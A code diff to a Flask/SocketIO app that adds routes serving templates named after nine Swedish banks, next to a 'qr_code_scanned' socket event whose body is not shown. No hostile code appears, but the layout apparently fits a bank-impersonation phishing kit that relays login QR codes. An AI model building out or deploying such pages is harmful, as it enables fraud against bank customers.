@@ -12,14 +12,42 @@ socketio = SocketIO(app, cors_allowed_origins='*')
 def index():
     return render_template("index.html")
 
+@app.route('/danske.html')
+def danske():
+    return render_template('danske.html')
+
+@app.route('/handelsbanken.html')
+def handelsbanken():
+    return render_template('handelsbanken.html')
+
+@app.route('/ica.html')
+def ica():
+    return render_template('ica.html')
+
+@app.route('/lansforsakringar.html')
+def lansforsakringar():
+    return render_template('lansforsakringar.html')
+
+@app.route('/nordea.html')
+def nordea():
+    return render_template('nordea.html')
+
+@app.route('/seb.html')
+def seb():
+    return render_template('seb.html')
+
+@app.route('/skandiabanken.html')
+def skandiabanken():
+    return render_template('skandiabanken.html')
+
+@app.route('/sparbanken.html')
+def sparbanken():
+    return render_template('sparbanken.html')
 
 @app.route('/swedbank.html')
 def swedbank():
     return render_template('swedbank.html')
 
-@app.route('/danske.html')
-def danske():
-    return render_template('danske.html')
 
 
 @socketio.on('qr_code_scanned')
